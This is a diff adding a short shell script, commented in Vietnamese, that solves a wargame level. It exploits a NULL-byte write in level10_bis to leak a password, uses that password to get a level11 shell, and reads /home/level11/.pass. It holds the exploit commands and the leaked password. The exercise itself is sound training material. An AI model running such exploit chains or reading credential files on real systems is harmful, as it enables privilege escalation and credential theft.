@@ -1,0 +1,17 @@
+# 1. Khai thác level10_bis bằng Arbitrary NULL Byte Write
+#    N = 1208267684 làm thay đổi _IO_read_ptr và khiến fread() lần 2
+#    đọc lại dữ liệu làm lộ password.
+
+env -i PWD=/tmp SHLVL=0 /levels/level10_bis "1208267684"
+
+
+# 2. Sử dụng password thu được để vượt qua level10
+#    strcmp(pwfile.pass, argv[1]) thành công và chương trình
+#    gọi execl("/bin/sh", "sh", 0), cấp shell của level11.
+
+env -i PWD=/tmp SHLVL=0 /levels/level10 'AveryLoNgPassword!!'
+
+
+# 3. Đọc password của level tiếp theo
+
+cat /home/level11/.pass
